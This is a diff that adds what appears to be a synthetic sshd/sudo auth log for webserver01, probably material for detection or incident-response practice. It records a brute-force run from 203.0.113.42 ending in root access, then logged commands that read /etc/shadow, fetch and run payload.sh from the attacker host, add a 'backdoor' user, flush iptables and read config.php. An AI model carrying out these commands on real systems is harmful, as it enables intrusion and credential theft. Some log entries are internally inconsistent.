@@ -1,0 +1,214 @@
+May 19 08:05:22 webserver01 sshd[10101]: Accepted publickey for deploy from 10.0.1.50 port 48201 ssh2: RSA SHA256:abc123def456ghi789jkl012mno345pqr678stu901vwx234
+May 19 08:05:22 webserver01 sshd[10101]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 08:05:23 webserver01 sshd[10101]: pam_unix(sshd:session): session closed for user deploy
+May 19 08:30:11 webserver01 sshd[10205]: Accepted password for admin from 10.0.1.51 port 49312 ssh2
+May 19 08:30:12 webserver01 sshd[10205]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 19 09:00:44 webserver01 sshd[10310]: Accepted publickey for ubuntu from 10.0.1.52 port 50123 ssh2: RSA SHA256:xyz789abc123def456ghi012jkl345mno678pqr901stu234
+May 19 09:00:45 webserver01 sshd[10310]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 09:15:33 webserver01 sshd[10205]: pam_unix(sshd:session): session closed for user admin
+May 19 09:23:45 webserver01 sshd[10422]: Accepted publickey for deploy from 10.0.1.50 port 48501 ssh2: RSA SHA256:abc123def456ghi789jkl012mno345pqr678stu901vwx234
+May 19 09:23:46 webserver01 sshd[10422]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 10:00:17 webserver01 sshd[10555]: Accepted password for monitoring from 10.0.1.51 port 51000 ssh2
+May 19 10:00:18 webserver01 sshd[10555]: pam_unix(sshd:session): session opened for user monitoring by (uid=0)
+May 19 10:45:09 webserver01 sshd[10555]: pam_unix(sshd:session): session closed for user monitoring
+May 19 11:00:03 webserver01 sshd[10310]: pam_unix(sshd:session): session closed for user ubuntu
+May 19 11:30:51 webserver01 sshd[10701]: Accepted publickey for admin from 10.0.1.52 port 52001 ssh2: RSA SHA256:mno678pqr901stu234vwx567yza890bcd123efg456hij789
+May 19 11:30:52 webserver01 sshd[10701]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 19 12:15:44 webserver01 sshd[10422]: pam_unix(sshd:session): session closed for user deploy
+May 19 13:00:22 webserver01 sshd[10801]: Accepted password for deploy from 10.0.1.50 port 48701 ssh2
+May 19 13:00:23 webserver01 sshd[10801]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 14:30:15 webserver01 sshd[10701]: pam_unix(sshd:session): session closed for user admin
+May 19 15:00:38 webserver01 sshd[10901]: Accepted publickey for ubuntu from 10.0.1.51 port 53100 ssh2: RSA SHA256:xyz789abc123def456ghi012jkl345mno678pqr901stu234
+May 19 15:00:39 webserver01 sshd[10901]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 16:00:12 webserver01 sshd[10801]: pam_unix(sshd:session): session closed for user deploy
+May 19 17:00:55 webserver01 sshd[10901]: pam_unix(sshd:session): session closed for user ubuntu
+May 19 17:45:30 webserver01 sshd[11001]: Accepted publickey for monitoring from 10.0.1.52 port 54200 ssh2: RSA SHA256:pqr678stu901vwx234yza567bcd890efg123hij456klm789
+May 19 17:45:31 webserver01 sshd[11001]: pam_unix(sshd:session): session opened for user monitoring by (uid=0)
+May 19 18:30:09 webserver01 sshd[11001]: pam_unix(sshd:session): session closed for user monitoring
+May 19 22:00:14 webserver01 sshd[11101]: Failed password for root from 192.168.100.11 port 45000 ssh2
+May 19 22:00:32 webserver01 sshd[11102]: Failed password for invalid user foobar from 192.168.100.11 port 45001 ssh2
+May 19 23:15:03 webserver01 sshd[11201]: Failed password for root from 203.0.113.42 port 52000 ssh2
+May 19 23:15:19 webserver01 sshd[11202]: Failed password for admin from 203.0.113.42 port 52001 ssh2
+May 19 23:15:35 webserver01 sshd[11203]: Failed password for ubuntu from 203.0.113.42 port 52002 ssh2
+May 19 23:15:51 webserver01 sshd[11204]: Failed password for pi from 203.0.113.42 port 52003 ssh2
+May 19 23:16:07 webserver01 sshd[11205]: Failed password for postgres from 203.0.113.42 port 52004 ssh2
+May 19 23:16:23 webserver01 sshd[11206]: Failed password for oracle from 203.0.113.42 port 52005 ssh2
+May 19 23:16:39 webserver01 sshd[11207]: Failed password for test from 203.0.113.42 port 52006 ssh2
+May 19 23:16:55 webserver01 sshd[11208]: Failed password for guest from 203.0.113.42 port 52007 ssh2
+May 19 23:17:11 webserver01 sshd[11209]: Failed password for operator from 203.0.113.42 port 52008 ssh2
+May 19 23:17:27 webserver01 sshd[11210]: Failed password for user from 203.0.113.42 port 52009 ssh2
+May 19 23:17:43 webserver01 sshd[11211]: Failed password for deploy from 203.0.113.42 port 52010 ssh2
+May 19 23:17:59 webserver01 sshd[11212]: Failed password for ftpuser from 203.0.113.42 port 52011 ssh2
+May 19 23:18:15 webserver01 sshd[11213]: Failed password for git from 203.0.113.42 port 52012 ssh2
+May 19 23:18:31 webserver01 sshd[11214]: Failed password for jenkins from 203.0.113.42 port 52013 ssh2
+May 19 23:18:47 webserver01 sshd[11215]: Failed password for mysql from 203.0.113.42 port 52014 ssh2
+May 19 23:19:03 webserver01 sshd[11216]: Failed password for nagios from 203.0.113.42 port 52015 ssh2
+May 19 23:19:19 webserver01 sshd[11217]: Failed password for tomcat from 203.0.113.42 port 52016 ssh2
+May 19 23:19:35 webserver01 sshd[11218]: Failed password for www-data from 203.0.113.42 port 52017 ssh2
+May 19 23:19:51 webserver01 sshd[11219]: Failed password for root from 203.0.113.42 port 52018 ssh2
+May 19 23:20:07 webserver01 sshd[11220]: Failed password for admin from 203.0.113.42 port 52019 ssh2
+May 19 23:20:23 webserver01 sshd[11221]: Failed password for ubuntu from 203.0.113.42 port 52020 ssh2
+May 19 23:20:39 webserver01 sshd[11222]: Failed password for pi from 203.0.113.42 port 52021 ssh2
+May 19 23:20:55 webserver01 sshd[11223]: Failed password for postgres from 203.0.113.42 port 52022 ssh2
+May 19 23:21:11 webserver01 sshd[11224]: Failed password for oracle from 203.0.113.42 port 52023 ssh2
+May 19 23:21:27 webserver01 sshd[11225]: Failed password for test from 203.0.113.42 port 52024 ssh2
+May 19 23:21:43 webserver01 sshd[11226]: Failed password for guest from 203.0.113.42 port 52025 ssh2
+May 19 23:21:59 webserver01 sshd[11227]: Failed password for operator from 203.0.113.42 port 52026 ssh2
+May 19 23:22:15 webserver01 sshd[11228]: Failed password for user from 203.0.113.42 port 52027 ssh2
+May 19 23:22:31 webserver01 sshd[11229]: Failed password for deploy from 203.0.113.42 port 52028 ssh2
+May 19 23:22:47 webserver01 sshd[11230]: Failed password for ftpuser from 203.0.113.42 port 52029 ssh2
+May 19 23:23:03 webserver01 sshd[11231]: Failed password for git from 203.0.113.42 port 52030 ssh2
+May 19 23:23:19 webserver01 sshd[11232]: Failed password for jenkins from 203.0.113.42 port 52031 ssh2
+May 19 23:23:35 webserver01 sshd[11233]: Failed password for mysql from 203.0.113.42 port 52032 ssh2
+May 19 23:23:51 webserver01 sshd[11234]: Failed password for nagios from 203.0.113.42 port 52033 ssh2
+May 19 23:24:07 webserver01 sshd[11235]: Failed password for tomcat from 203.0.113.42 port 52034 ssh2
+May 19 23:24:23 webserver01 sshd[11236]: Failed password for www-data from 203.0.113.42 port 52035 ssh2
+May 19 23:24:39 webserver01 sshd[11237]: Failed password for root from 203.0.113.42 port 52036 ssh2
+May 19 23:24:55 webserver01 sshd[11238]: Failed password for admin from 203.0.113.42 port 52037 ssh2
+May 19 23:25:11 webserver01 sshd[11239]: Failed password for ubuntu from 203.0.113.42 port 52038 ssh2
+May 19 23:25:27 webserver01 sshd[11240]: Failed password for pi from 203.0.113.42 port 52039 ssh2
+May 19 23:25:43 webserver01 sshd[11241]: Failed password for postgres from 203.0.113.42 port 52040 ssh2
+May 19 23:25:59 webserver01 sshd[11242]: Failed password for oracle from 203.0.113.42 port 52041 ssh2
+May 19 23:26:15 webserver01 sshd[11243]: Failed password for test from 203.0.113.42 port 52042 ssh2
+May 19 23:26:31 webserver01 sshd[11244]: Failed password for guest from 203.0.113.42 port 52043 ssh2
+May 19 23:26:47 webserver01 sshd[11245]: Failed password for operator from 203.0.113.42 port 52044 ssh2
+May 19 23:27:03 webserver01 sshd[11246]: Failed password for user from 203.0.113.42 port 52045 ssh2
+May 19 23:27:19 webserver01 sshd[11247]: Failed password for deploy from 203.0.113.42 port 52046 ssh2
+May 19 23:27:35 webserver01 sshd[11248]: Failed password for ftpuser from 203.0.113.42 port 52047 ssh2
+May 19 23:27:51 webserver01 sshd[11249]: Failed password for git from 203.0.113.42 port 52048 ssh2
+May 19 23:28:07 webserver01 sshd[11250]: Failed password for jenkins from 203.0.113.42 port 52049 ssh2
+May 19 23:28:23 webserver01 sshd[11251]: Failed password for mysql from 203.0.113.42 port 52050 ssh2
+May 19 23:28:39 webserver01 sshd[11252]: Failed password for nagios from 203.0.113.42 port 52051 ssh2
+May 19 23:28:55 webserver01 sshd[11253]: Failed password for tomcat from 203.0.113.42 port 52052 ssh2
+May 19 23:29:11 webserver01 sshd[11254]: Failed password for www-data from 203.0.113.42 port 52053 ssh2
+May 19 23:29:27 webserver01 sshd[11255]: Failed password for root from 203.0.113.42 port 52054 ssh2
+May 19 23:29:43 webserver01 sshd[11256]: Failed password for admin from 203.0.113.42 port 52055 ssh2
+May 19 23:29:59 webserver01 sshd[11257]: Failed password for ubuntu from 203.0.113.42 port 52056 ssh2
+May 19 23:30:15 webserver01 sshd[11258]: Failed password for pi from 203.0.113.42 port 52057 ssh2
+May 19 23:30:31 webserver01 sshd[11259]: Failed password for postgres from 203.0.113.42 port 52058 ssh2
+May 19 23:30:47 webserver01 sshd[11260]: Failed password for oracle from 203.0.113.42 port 52059 ssh2
+May 19 23:31:03 webserver01 sshd[11261]: Failed password for test from 203.0.113.42 port 52060 ssh2
+May 19 23:31:19 webserver01 sshd[11262]: Failed password for guest from 203.0.113.42 port 52061 ssh2
+May 19 23:31:35 webserver01 sshd[11263]: Failed password for operator from 203.0.113.42 port 52062 ssh2
+May 19 23:31:51 webserver01 sshd[11264]: Failed password for user from 203.0.113.42 port 52063 ssh2
+May 19 23:32:07 webserver01 sshd[11265]: Failed password for deploy from 203.0.113.42 port 52064 ssh2
+May 19 23:32:23 webserver01 sshd[11266]: Failed password for ftpuser from 203.0.113.42 port 52065 ssh2
+May 19 23:32:39 webserver01 sshd[11267]: Failed password for git from 203.0.113.42 port 52066 ssh2
+May 19 23:32:55 webserver01 sshd[11268]: Failed password for jenkins from 203.0.113.42 port 52067 ssh2
+May 19 23:33:11 webserver01 sshd[11269]: Failed password for mysql from 203.0.113.42 port 52068 ssh2
+May 19 23:33:27 webserver01 sshd[11270]: Failed password for nagios from 203.0.113.42 port 52069 ssh2
+May 19 23:33:43 webserver01 sshd[11271]: Failed password for tomcat from 203.0.113.42 port 52070 ssh2
+May 19 23:33:59 webserver01 sshd[11272]: Failed password for www-data from 203.0.113.42 port 52071 ssh2
+May 19 23:34:15 webserver01 sshd[11273]: Failed password for root from 203.0.113.42 port 52072 ssh2
+May 19 23:34:31 webserver01 sshd[11274]: Failed password for admin from 203.0.113.42 port 52073 ssh2
+May 19 23:34:47 webserver01 sshd[11275]: Failed password for ubuntu from 203.0.113.42 port 52074 ssh2
+May 19 23:35:03 webserver01 sshd[11276]: Failed password for pi from 203.0.113.42 port 52075 ssh2
+May 19 23:35:19 webserver01 sshd[11277]: Failed password for postgres from 203.0.113.42 port 52076 ssh2
+May 19 23:35:35 webserver01 sshd[11278]: Failed password for oracle from 203.0.113.42 port 52077 ssh2
+May 19 23:35:51 webserver01 sshd[11279]: Failed password for test from 203.0.113.42 port 52078 ssh2
+May 19 23:36:07 webserver01 sshd[11280]: Failed password for guest from 203.0.113.42 port 52079 ssh2
+May 19 23:36:23 webserver01 sshd[11281]: Failed password for operator from 203.0.113.42 port 52080 ssh2
+May 19 23:36:39 webserver01 sshd[11282]: Failed password for user from 203.0.113.42 port 52081 ssh2
+May 19 23:36:55 webserver01 sshd[11283]: Failed password for deploy from 203.0.113.42 port 52082 ssh2
+May 19 23:37:11 webserver01 sshd[11284]: Failed password for ftpuser from 203.0.113.42 port 52083 ssh2
+May 19 23:37:27 webserver01 sshd[11285]: Failed password for git from 203.0.113.42 port 52084 ssh2
+May 19 23:37:43 webserver01 sshd[11286]: Failed password for jenkins from 203.0.113.42 port 52085 ssh2
+May 19 23:37:59 webserver01 sshd[11287]: Failed password for mysql from 203.0.113.42 port 52086 ssh2
+May 19 23:38:15 webserver01 sshd[11288]: Failed password for nagios from 203.0.113.42 port 52087 ssh2
+May 19 23:38:31 webserver01 sshd[11289]: Failed password for tomcat from 203.0.113.42 port 52088 ssh2
+May 19 23:38:47 webserver01 sshd[11290]: Failed password for www-data from 203.0.113.42 port 52089 ssh2
+May 19 23:39:03 webserver01 sshd[11291]: Failed password for root from 203.0.113.42 port 52090 ssh2
+May 19 23:39:19 webserver01 sshd[11292]: Failed password for admin from 203.0.113.42 port 52091 ssh2
+May 19 23:39:35 webserver01 sshd[11293]: Failed password for ubuntu from 203.0.113.42 port 52092 ssh2
+May 19 23:39:51 webserver01 sshd[11294]: Failed password for pi from 203.0.113.42 port 52093 ssh2
+May 19 23:40:07 webserver01 sshd[11295]: Failed password for postgres from 203.0.113.42 port 52094 ssh2
+May 19 23:40:23 webserver01 sshd[11296]: Failed password for oracle from 203.0.113.42 port 52095 ssh2
+May 19 23:40:39 webserver01 sshd[11297]: Failed password for test from 203.0.113.42 port 52096 ssh2
+May 19 23:40:55 webserver01 sshd[11298]: Failed password for guest from 203.0.113.42 port 52097 ssh2
+May 19 23:41:11 webserver01 sshd[11299]: Failed password for operator from 203.0.113.42 port 52098 ssh2
+May 19 23:41:27 webserver01 sshd[11300]: Failed password for user from 203.0.113.42 port 52099 ssh2
+May 19 23:41:43 webserver01 sshd[11301]: Failed password for deploy from 203.0.113.42 port 52100 ssh2
+May 19 23:41:59 webserver01 sshd[11302]: Failed password for ftpuser from 203.0.113.42 port 52101 ssh2
+May 19 23:42:15 webserver01 sshd[11303]: Failed password for git from 203.0.113.42 port 52102 ssh2
+May 19 23:42:31 webserver01 sshd[11304]: Failed password for jenkins from 203.0.113.42 port 52103 ssh2
+May 19 23:42:47 webserver01 sshd[11305]: Failed password for mysql from 203.0.113.42 port 52104 ssh2
+May 19 23:43:03 webserver01 sshd[11306]: Failed password for nagios from 203.0.113.42 port 52105 ssh2
+May 19 23:43:19 webserver01 sshd[11307]: Failed password for tomcat from 203.0.113.42 port 52106 ssh2
+May 19 23:43:35 webserver01 sshd[11308]: Failed password for www-data from 203.0.113.42 port 52107 ssh2
+May 19 23:43:51 webserver01 sshd[11309]: Failed password for root from 203.0.113.42 port 52108 ssh2
+May 19 23:44:07 webserver01 sshd[11310]: Failed password for admin from 203.0.113.42 port 52109 ssh2
+May 19 23:44:23 webserver01 sshd[11311]: Failed password for ubuntu from 203.0.113.42 port 52110 ssh2
+May 19 23:44:39 webserver01 sshd[11312]: Failed password for pi from 203.0.113.42 port 52111 ssh2
+May 19 23:44:55 webserver01 sshd[11313]: Failed password for postgres from 203.0.113.42 port 52112 ssh2
+May 19 23:45:11 webserver01 sshd[11314]: Failed password for oracle from 203.0.113.42 port 52113 ssh2
+May 19 23:45:27 webserver01 sshd[11315]: Failed password for test from 203.0.113.42 port 52114 ssh2
+May 19 23:45:43 webserver01 sshd[11316]: Failed password for guest from 203.0.113.42 port 52115 ssh2
+May 19 23:45:59 webserver01 sshd[11317]: Failed password for operator from 203.0.113.42 port 52116 ssh2
+May 19 23:46:15 webserver01 sshd[11318]: Failed password for user from 203.0.113.42 port 52117 ssh2
+May 19 23:46:31 webserver01 sshd[11319]: Failed password for deploy from 203.0.113.42 port 52118 ssh2
+May 19 23:46:47 webserver01 sshd[11320]: Failed password for ftpuser from 203.0.113.42 port 52119 ssh2
+May 19 23:47:03 webserver01 sshd[11321]: Failed password for git from 203.0.113.42 port 52120 ssh2
+May 19 23:47:19 webserver01 sshd[11322]: Failed password for root from 203.0.113.42 port 52121 ssh2
+May 19 23:47:35 webserver01 sshd[11323]: Failed password for admin from 203.0.113.42 port 52122 ssh2
+May 19 23:47:51 webserver01 sshd[11324]: Failed password for ubuntu from 203.0.113.42 port 52123 ssh2
+May 19 23:48:07 webserver01 sshd[11325]: Failed password for root from 203.0.113.42 port 52124 ssh2
+May 19 23:48:23 webserver01 sshd[11326]: Failed password for root from 203.0.113.42 port 52125 ssh2
+May 19 23:48:39 webserver01 sshd[11327]: Failed password for root from 203.0.113.42 port 52126 ssh2
+May 19 23:48:55 webserver01 sshd[11328]: Failed password for root from 203.0.113.42 port 52127 ssh2
+May 19 23:49:11 webserver01 sshd[11329]: Failed password for root from 203.0.113.42 port 52128 ssh2
+May 19 23:49:27 webserver01 sshd[11330]: Failed password for root from 203.0.113.42 port 52129 ssh2
+May 19 23:49:43 webserver01 sshd[11331]: Failed password for root from 203.0.113.42 port 52130 ssh2
+May 19 23:49:59 webserver01 sshd[11332]: Failed password for root from 203.0.113.42 port 52131 ssh2
+May 19 23:50:15 webserver01 sshd[11333]: Failed password for root from 203.0.113.42 port 52132 ssh2
+May 19 23:50:31 webserver01 sshd[11334]: Failed password for root from 203.0.113.42 port 52133 ssh2
+May 19 23:50:47 webserver01 sshd[11335]: Failed password for root from 203.0.113.42 port 52134 ssh2
+May 19 23:51:03 webserver01 sshd[11336]: Failed password for root from 203.0.113.42 port 52135 ssh2
+May 19 23:51:19 webserver01 sshd[11337]: Failed password for root from 203.0.113.42 port 52136 ssh2
+May 19 23:51:35 webserver01 sshd[11338]: Failed password for root from 203.0.113.42 port 52137 ssh2
+May 19 23:51:51 webserver01 sshd[11339]: Failed password for root from 203.0.113.42 port 52138 ssh2
+May 19 23:52:07 webserver01 sshd[11400]: Accepted password for root from 203.0.113.42 port 52198 ssh2
+May 19 23:52:08 webserver01 sshd[11400]: pam_unix(sshd:session): session opened for user root by (uid=0)
+May 19 23:52:09 webserver01 sshd[11400]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=/dev/pts/0 ruser= rhost=
+May 19 23:52:11 webserver01 sudo[11401]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+May 19 23:52:14 webserver01 sshd[11402]: pam_unix(sudo:session): session opened for user root by root(uid=0)
+May 19 23:52:18 webserver01 sudo[11403]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/id
+May 19 23:52:22 webserver01 sudo[11404]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+May 19 23:52:28 webserver01 sudo[11405]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.42/payload.sh
+May 19 23:52:35 webserver01 sudo[11406]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/payload.sh
+May 19 23:52:39 webserver01 sudo[11407]:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/payload.sh
+May 19 23:52:45 webserver01 sshd[11408]: Accepted password for admin from 10.0.1.50 port 48900 ssh2
+May 19 23:52:46 webserver01 sshd[11408]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 19 23:52:51 webserver01 sudo[11409]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m backdoor
+May 19 23:52:58 webserver01 sudo[11410]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /etc/passwd /tmp/passwd.bak
+May 19 23:53:04 webserver01 sudo[11411]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -F
+May 19 23:53:11 webserver01 sudo[11412]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e
+May 19 23:53:18 webserver01 sudo[11413]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/ss -tulpn
+May 19 23:53:25 webserver01 sudo[11414]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -name "*.conf" -readable
+May 19 23:53:32 webserver01 sshd[11415]: pam_unix(sshd:session): session opened for user root by root(uid=0)
+May 19 23:53:40 webserver01 sudo[11416]:     root : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /var/www/html/config.php
+May 19 23:53:48 webserver01 sudo[11417]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysql -u root -p
+May 19 23:53:55 webserver01 sshd[11418]: Received disconnect from 203.0.113.42 port 52198:11: disconnected by user
+May 20 08:15:22 webserver01 sshd[11501]: Accepted publickey for deploy from 10.0.1.50 port 48201 ssh2: RSA SHA256:abc123def456ghi789jkl012mno345pqr678stu901vwx234
+May 20 08:15:23 webserver01 sshd[11501]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 09:00:44 webserver01 sshd[11601]: Accepted password for admin from 10.0.1.51 port 49500 ssh2
+May 20 09:00:45 webserver01 sshd[11601]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 20 10:30:15 webserver01 sshd[11501]: pam_unix(sshd:session): session closed for user deploy
+May 20 11:00:33 webserver01 sshd[11701]: Accepted publickey for ubuntu from 10.0.1.52 port 50200 ssh2: RSA SHA256:xyz789abc123def456ghi012jkl345mno678pqr901stu234
+May 20 11:00:34 webserver01 sshd[11701]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 12:30:51 webserver01 sshd[11601]: pam_unix(sshd:session): session closed for user admin
+May 20 13:45:09 webserver01 sshd[11801]: Accepted publickey for monitoring from 10.0.1.51 port 51100 ssh2: RSA SHA256:pqr678stu901vwx234yza567bcd890efg123hij456klm789
+May 20 13:45:10 webserver01 sshd[11801]: pam_unix(sshd:session): session opened for user monitoring by (uid=0)
+May 20 15:00:27 webserver01 sshd[11701]: pam_unix(sshd:session): session closed for user ubuntu
+May 20 16:30:45 webserver01 sshd[11801]: pam_unix(sshd:session): session closed for user monitoring
+May 21 08:10:14 webserver01 sshd[11901]: Accepted publickey for deploy from 10.0.1.50 port 48600 ssh2: RSA SHA256:abc123def456ghi789jkl012mno345pqr678stu901vwx234
+May 21 08:10:15 webserver01 sshd[11901]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 21 09:00:32 webserver01 sshd[12001]: Accepted password for admin from 10.0.1.52 port 52300 ssh2
+May 21 09:00:33 webserver01 sshd[12001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 21 10:15:50 webserver01 sshd[11901]: pam_unix(sshd:session): session closed for user deploy
+May 21 11:30:08 webserver01 sshd[12101]: Accepted publickey for ubuntu from 10.0.1.51 port 53400 ssh2: RSA SHA256:xyz789abc123def456ghi012jkl345mno678pqr901stu234
+May 21 11:30:09 webserver01 sshd[12101]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 21 12:00:26 webserver01 sshd[12001]: pam_unix(sshd:session): session closed for user admin
+May 21 13:30:43 webserver01 sshd[12201]: Accepted publickey for monitoring from 10.0.1.50 port 54500 ssh2: RSA SHA256:pqr678stu901vwx234yza567bcd890efg123hij456klm789
+May 21 13:30:44 webserver01 sshd[12201]: pam_unix(sshd:session): session opened for user monitoring by (uid=0)
+May 21 14:45:01 webserver01 sshd[12101]: pam_unix(sshd:session): session closed for user ubuntu
+May 21 15:30:19 webserver01 sshd[12201]: pam_unix(sshd:session): session closed for user monitoring
